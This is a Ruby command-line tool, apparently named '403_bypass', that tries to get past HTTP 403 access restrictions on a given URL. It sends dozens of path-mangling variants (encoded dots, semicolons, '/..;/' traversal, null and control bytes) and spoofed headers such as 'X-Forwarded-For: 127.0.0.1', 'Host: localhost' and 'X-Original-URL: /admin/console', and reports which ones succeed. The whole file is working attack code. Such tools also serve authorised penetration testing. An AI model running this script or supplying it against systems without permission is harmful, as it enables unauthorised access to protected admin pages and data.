require 'net/http'
require 'uri'

COLOR_RESET = "\033[0m"
COLOR_RED = "\033[31m"
COLOR_GREEN = "\033[32m"
COLOR_YELLOW = "\033[33m"

def get_path(url)
  URI(url).path.split('/').last
end

def get_url(url)
  URI(url).tap { |uri| uri.path = '' }.to_s
end

def check_connection(url)
  uri = URI(url)
  begin
    Net::HTTP.start(uri.host, uri.port, { use_ssl: uri.scheme == 'https' }) do |http|
      http.request_head(uri)
    end
    return true
  rescue StandardError
    puts "[!] Could not get \"#{url}\"."
    puts "     Please check your internet connection."
    return false
  end
end

def request(url)
  uri = URI(url)
  response = Net::HTTP.get_response(uri)
  status_code = response.code.to_i

  case status_code
  when 200
    puts "#{COLOR_GREEN}#{response.code}#{COLOR_RESET} => #{url}"
  when 401, 403, 404
    puts "#{COLOR_RED}#{response.code}#{COLOR_RESET} => #{url}"
  else
    puts "#{COLOR_YELLOW}#{response.code}#{COLOR_RESET} => #{url}"
  end
rescue StandardError => e
  puts "[!] An error occurred while making the request: #{e.message}"
end

def request_with_headers(url, header, value)
  uri = URI(url)
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = uri.scheme == 'https'

  request = Net::HTTP::Get.new(uri)
  request[header] = value

  response = http.request(request)
  status_code = response.code.to_i

  case status_code
  when 200
    puts "#{COLOR_GREEN}#{response.code}#{COLOR_RESET} => #{url} (#{header}: #{value})"
  when 401, 403, 404
    puts "#{COLOR_RED}#{response.code}#{COLOR_RESET} => #{url} (#{header}: #{value})"
  else
    puts "#{COLOR_YELLOW}#{response.code}#{COLOR_RESET} => #{url} (#{header}: #{value})"
  end
rescue StandardError => e
  puts "[!] An error occurred while making the request: #{e.message}"
end

def main
  if ARGV.length < 1 || ARGV[0] == '-h' || ARGV[0] == '--help'
    puts "Usage: 403_bypass <url>"
    puts "Example: 403_bypass \"http://example.com/secrets\""
    return
  end

  base_url = ARGV[0]
  return unless check_connection(base_url)

  path = get_path(base_url)
  url = get_url(base_url)

  if path.empty?
    puts "[-] Please enter a valid path."
    puts "Example: http://example.com/secrets"
    return
  end

  request("#{url}/#{path}")                  # example.com/secret
  request("#{url}/#{path.upcase}")           # example.com/SECRET
  request("#{url}/#{path}/")                 # example.com/secret/
  request("#{url}//#{path}//")               # example.com//secret//
  request("#{url}/;/#{path}")                # example.com/;/secret
  request("#{url}//;//#{path}")              # example.com//;//secret
  request("#{url}/.;/#{path}")               # example.com/.;/secret
  request("#{url}/%2e/#{path}")              # example.com/%2e/secret
  request("#{url}/%252e/#{path}")            # example.com/%252e/secret
  request("#{url}/%ef%bc%8f#{path}")         # example.com/%ef%bc%8fsecret
  request("#{url}/#{path}%20")               # example.com/secret%20
  request("#{url}/#{path}%09")               # example.com/secret%09
  request("#{url}/#{path}.json")             # example.com/secret.json
  request("#{url}/#{path}.html")             # example.com/secret.html
  request("#{url}/#{path}.php")              # example.com/secret.php
  request("#{url}/#{path}/*")                # example.com/secret/*
  request("#{url}/#{path}?")                 # example.com/secret?
  request("#{url}/#{path}/?blob")            # example.com/secret/?blob
  request("#{url}/#{path}#")                 # example.com/secret#
  request("#{url}/#{path}/./")               # example.com/secret./
  request("#{url}/#{path}/%20./")            # example.com/secret%20./
  request("#{url}/#{path}/../")              # example.com/secret/../
  request("#{url}/#{path}/..;/")             # example.com/secret/..;/
  request("#{url}/#{path}/%20/")             # example.com/secret%20/

  request_with_headers(base_url, "X-Originating-IP", "127.0.0.1")
  request_with_headers(base_url, "X-Forwarded-For", "127.0.0.1")
  request_with_headers(base_url, "X-Forwarded", "127.0.0.1")
  request_with_headers(base_url, "Forwarded-For", "127.0.0.1")
  request_with_headers(base_url, "X-Remote-IP", "127.0.0.1")
  request_with_headers(base_url, "X-Remote-Addr", "127.0.0.1")
  request_with_headers(base_url, "X-ProxyUser-Ip", "127.0.0.1")
  request_with_headers(base_url, "X-Original-URL", "127.0.0.1")
  request_with_headers(base_url, "Client-IP", "127.0.0.1")
  request_with_headers(base_url, "True-Client-IP", "127.0.0.1")
  request_with_headers(base_url, "Cluster-Client-IP", "127.0.0.1")
  request_with_headers(base_url, "Host", "localhost")
  request_with_headers(base_url, "X-Original-URL", "/admin/console")
  request_with_headers(base_url, "X-Rewrite-URL", "/admin/console")
  request_with_headers(base_url, "Referer", "http://www.example.com")
  request_with_headers(base_url, "Accept-Language", "en-US,en;q=0.9")
  request_with_headers(base_url, "Cookie", "sessionid=1234567890")
  request_with_headers(base_url, "Authorization", "Bearer your_access_token_here")
  request_with_headers(base_url, "Connection", "keep-alive")
  request_with_headers(base_url, "Accept-Encoding", "gzip, deflate")
  request_with_headers(base_url, "DNT", "1")
  request_with_headers(base_url, "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
  request_with_headers(base_url, "Cache-Control", "no-cache")
  request_with_headers(base_url, "Pragma", "no-cache")
  request_with_headers(base_url, "If-Modified-Since", "Sat, 29 Oct 1994 19:43:31 GMT")
  request_with_headers(base_url, "If-None-Match", "W/\"xyz123\"")
  request_with_headers(base_url, "Accept-Charset", "utf-8")
  request_with_headers(base_url, "X-Requested-With", "XMLHttpRequest")
  request_with_headers(base_url, "X-CSRF-Token", "your_csrf_token_here")
  request_with_headers(base_url, "Content-Type", "application/json")
  request_with_headers(base_url, "X-HTTP-Method-Override", "PUT")
  request_with_headers(base_url, "Accept-Ranges", "bytes")
  request_with_headers(base_url, "ETag", "\"abc123\"")
  request_with_headers(base_url, "If-Match", "\"abc123\"")
  request_with_headers(base_url, "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8")

  # Add more bypass attempts here
  request("#{url}/#{path}~")                 # example.com/secret~
  request("#{url}/#{path}#~")                # example.com/secret#~
  request("#{url}/#{path}#@")                # example.com/secret#@
  request("#{url}/#{path}??")                # example.com/secret??
  request("#{url}/#{path}/..;/~")            # example.com/secret/..;/~
  request("#{url}/#{path}?=")                # example.com/secret?=
  request("#{url}/#{path}/?/")               # example.com/secret/?/
  request("#{url}/#{path}/.?/")              # example.com/secret/.?/
  request("#{url}/#{path}/;?")               # example.com/secret/;?
  request("#{url}/#{path}/??")               # example.com/secret/??/
  request("#{url}/#{path}/@?")               # example.com/secret/@?
  request("#{url}/#{path}/../?/")            # example.com/secret/../?/
  request("#{url}/#{path}/%20/?/")           # example.com/secret%20/?/
  request("#{url}/#{path}/%2e%2e/")          # example.com/secret/%2e%2e/
  request("#{url}/#{path}/%2e%2e%2f")        # example.com/secret/%2e%2e%2f
  request("#{url}/#{path}/%252e%252e/")      # example.com/secret/%252e%252e/
  request("#{url}/#{path}/%252e%252e%252f")  # example.com/secret/%252e%252e%252f
  request("#{url}/#{path}?~")                # example.com/secret?~
  request("#{url}/#{path}/%20/..;/")         # example.com/secret%20/..;/
  request("#{url}/#{path}/.random/")         # example.com/secret/.random/
  request("#{url}/#{path}/%20./")            # example.com/secret%20./
  request("#{url}/#{path}/%00/")             # example.com/secret%00/
  request("#{url}/#{path}/%09/")             # example.com/secret%09/
  request("#{url}/#{path}/%2e/")             # example.com/secret%2e/
  request("#{url}/#{path}/%20/")             # example.com/secret%20/
  request("#{url}/#{path}/%09/")             # example.com/secret%09/
  request("#{url}/#{path}/%0d/")             # example.com/secret%0d/
  request("#{url}/#{path}/%0a/")             # example.com/secret%0a/


end

main
